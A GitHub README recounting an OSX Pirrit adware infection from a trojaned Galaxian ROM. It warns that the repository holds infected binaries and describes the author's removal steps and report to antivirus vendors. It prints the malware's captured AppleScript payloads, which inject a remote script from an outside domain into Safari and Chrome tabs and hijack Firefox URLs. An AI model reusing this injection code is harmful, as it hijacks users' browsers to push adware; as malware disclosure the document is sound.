Warning
=======

This repository contains binaries that are infected with the OSX Pirrit malware.

Backstory
=========

Recently I've been volunteering some of my free time to help children learn to program software and tinker with electronics and I thought it might be neat for the kids to build an old school arcade machine. As part of my initial research into this I had compiled MAME on my new MacBook and was searching for some ROMs to try out. The first ROM that I downloaded just happened to be infected with some nasty Malware...

If you're curious, the ROM was for [Galaxian](https://en.wikipedia.org/wiki/Galaxian) and [here is/was the actual download link](http://www.freeroms.com/dl_roms/rom_download.php?title=galaxian_midway&system=MAME&game_id=5674). 

Now at this point I should mention that from time-to-time I can be quite a careless individual. The ROM in question was packaged such that upon execution I was immediately asked to enter my root password. Stupid me complied without thinking twice. It was late. I was tired. And quite frankly my fingers were typing in auto-pilot mode at this point. My bad.

Almost immediately I knew that I had f**ked up.

Suddenly, some shadey "software services" appeared on my laptop and Safari started behaving oddly. Convinced that I'd been compromised by "something" I immediately downloaded ESET Cyber Security for Mac and ran a scan. 

Nothing.... My MacBook appeared clean. I was not convinced.

I checked my running processes and one in particular stood out. It looked like a whole bunch of javascript code passed as an argument to "/usr/bin/osascript".

```
  501   514   509   0 12:56pm ??         0:11.84 /usr/bin/osascript -e global _pid^M\012set _pid to "Aa865780bfe3e8a8f-0-FS-AU"^M\012^M\012repeat^M\012«event XFdrIjct» {} ^M\012end repeat^M\012^M\012^M\012on «event XFdrIjct» {}^M\012delay 0.5^M\012try^M\012if is_Safari_running() then^M\012tell application "Safari" ^M\012tell application "Safari" to set page_source to do JavaScript "document.body.innerHTML;" in current tab of first window ^M\012if page_source does not contain _pid then^M\012set theURL to URL of current tab of first window^M\012if theURL is not equal to "about:blank" then^M\012tell application "Safari" to do JavaScript "document.body.innerHTML='<div style=\"display:none;\">" & _pid & "</div>'+document.body.innerHTML;" in current tab of first window ^M\012tell application "Safari" to do JavaScript "var js_script = document.createElement('script'); js_script.type = \"text/javascript\"; js_script.src = \"//aa9bd78f328a6a41279d0fad0a88df1901.com/sm/mu?id=A6BD07C5-B140-575D-8AD6-AFD19EF5FCF4&d=Aa865780bfe3e8a8f-0-FS-AU&cl=0\"; document.getElementsByTagName('head')[0].appendChild(js_script);" in current tab of first window^M\012end if ^M\012end if^M\012end tell^M\012end if^M\012end try^M\012end «event XFdrIjct»^M\012^M\012on is_Safari_running() ^M\012tell application "System Events" to (name of processes) contains "Safari"^M\012end is_Safari_running
  501   516   509   0 12:56pm ??         0:01.87 /usr/bin/osascript -e global delayTime^M\012set delayTime to 99999999^M\012global newTabUrl^M\012set newTabUrl to "'http://google.com'"^M\012global currentUrl^M\012set currentUrl to ""^M\012global previousUrl^M\012set previousUrl to ""^M\012global newTabWithPrev^M\012set newTabWithPrev to ""^M\012^M\012repeat^M\012«event XFdrIjct» {}^M\012end repeat^M\012^M\012on «event XFdrIjct» {}^M\012delay (delayTime * 60)^M\012try^M\012if is_Firefox_running() then^M\012tell application "Firefox" to activate^M\012tell application "System Events"^M\012keystroke "l" using command down^M\012keystroke "c" using command down^M\012delay(1)^M\012end tell^M\012set currentUrl to the clipboard^M\012^M\012if currentUrl is not equal to previousUrl then^M\012set newTabUrlWithPrev to newTabUrl^M\012set newTabUrlWithPrev to replace_chars(newTabUrlWithPrev, "[CONTEXT_URL]", currentUrl)^M\012tell application "Firefox"^M\012open location newTabUrlWithPrev^M\012end tell^M\012set previousUrl to newTabUrlWithPrev^M\012end if^M\012end if^M\012end try^M\012end «event XFdrIjct»^M\012^M\012on is_Firefox_running()^M\012tell application "System Events" to (name of processes) contains "firefox"^M\012end is_Firefox_running^M\012^M\012on replace_chars(this_text, search_string, replacement_string)^M\012set AppleScript's text item delimiters to the search_string^M\012set the item_list to every text item of this_text^M\012set AppleScript's text item delimiters to the replacement_string^M\012set this_text to the item_list as string^M\012set AppleScript's text item delimiters to ""^M\012return this_text^M\012end replace_chars
  501 66630   509   0  7:16pm ??         0:00.04 /usr/bin/osascript -e global _pid^M\012set _pid to "Aa865780bfe3e8a8f-0-FS-AU" ^M\012repeat^M\012«event XFdrIjct» {}^M\012end repeat^M\012^M\012on «event XFdrIjct» {} ^M\012delay 0.5^M\012try^M\012if is_Chrome_running() then^M\012tell application "Google Chrome" to tell active tab of window 1^M\012set sourceHtml to execute javascript "document.getElementsByTagName('html')[0].innerHTML"^M\012if sourceHtml does not contain _pid then^M\012tell application "Google Chrome" to execute front window's active tab javascript "document.body.innerHTML='<div style=\"display:none;\">" & _pid & "</div>'+document.body.innerHTML;" ^M\012tell application "Google Chrome" to execute front window's active tab javascript "var js_script = document.createElement('script'); js_script.type = \"text/javascript\"; js_script.src = \"//aa9bd78f328a6a41279d0fad0a88df1901.com/sm/mu?id=A6BD07C5-B140-575D-8AD6-AFD19EF5FCF4&d=Aa865780bfe3e8a8f-0-FS-AU&cl=0\"; document.getElementsByTagName('head')[0].appendChild(js_script);"^M\012end if^M\012end tell^M\012end if^M\012end try^M\012end «event XFdrIjct»^M\012^M\012on is_Chrome_running() ^M\012tell application "System Events" to (name of processes) contains "Google Chrome"^M\012end is_Chrome_running
  501 66632 41100   0  7:16pm ttys000    0:00.00 grep osa
```

What in the hell is osascript? A quick google search revealed it to be part of the [Apple Open Scripting Architecture](https://developer.apple.com/library/content/documentation/AppleScript/Conceptual/AppleScriptX/Concepts/osa.html). 

A closer look and I could see that something else was being "bootstrapped" from the the domain aa9bd78f328a6a41279d0fad0a88df1901.com. Looks legit right?....

So I run a wget on the full URL and inspect the result which [you can see here](../blob/master/malicious.js). And there it was. Shitty adware.

I run some "kill -9" commands on the osascript processes but they just keep coming back. O.K. what's kicking THEM off? I check the PPID on the process and reveal it to be "/Library/research/research". I back him up ([downloadable here]((../blob/master/research.do.not.execute)) so I can take a closer look later -- then I delete it from its current location. I kill the process and all of the "osascript" child processes, which don't respawn. A quick cleanup of some shady .plist files and I'm satisfied that I've managed to get rid of it.

Why didn't AV pick it up?
=========================

So this I didn't expect. Surely this malware has been classified by now? So I post a question to [/r/malware](https://redd.it/5ea9bd) and shortly later I get a response from Cyber Security Researcher [Amit Serper](https://twitter.com/0xAmit) of [Cybereason](http://cybereason.com). Amit explains that the malware I'd encountered is a variant of OSX Pirrit which he initially discovered and analysed earlier in the year. [Here is that analysis](http://go.cybereason.com/rs/996-YZT-709/images/Cybereason-Lab-Analysis-OSX-Pirrit-4-6-16.pdf) if you're interested.

So this is a new varient of the same Malware OSX Pirrit and my AV simply didn't have a signature for it yet. Being the nice guy that I am, I follow ESET's instructions on [how to report a suspicious file](http://support.eset.com/kb141/#SubmitFile). Within hours I get a reply thanking me for my submission and that a signature update would be pushed out shortly. Which it was. In fact, the turn-around time was literally *just hours* which speaks volumes on ESET and their AV products.
